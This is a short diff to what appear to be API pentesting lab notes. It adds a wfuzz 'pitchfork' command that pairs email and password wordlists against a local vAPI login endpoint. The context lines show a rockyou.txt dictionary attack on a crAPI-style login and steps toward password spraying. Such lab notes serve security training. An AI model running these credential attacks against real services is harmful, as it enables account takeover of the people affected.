@@ -10,6 +10,11 @@
 ## Wfuzz Bruteforce/Dictionaty Attack
      wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 405
 
+Pitchfork with wfuzz - 
+        
+        wfuzz -z file,emails.txt -z file,pws.txt -X POST -d '{"email":"FUZZ","password":"FUZ2Z"}' -H "Content-Type:application/json" -u http://localhost/vapi/api2/user/login --hc 401
+
+
 ## Using Excessive Data Exposure to get usernames and try Password Spraying
 1. If excessive data exposure is found in any responses, select "Save Response to File"
 2. Try to grep strings that match email requirements. 
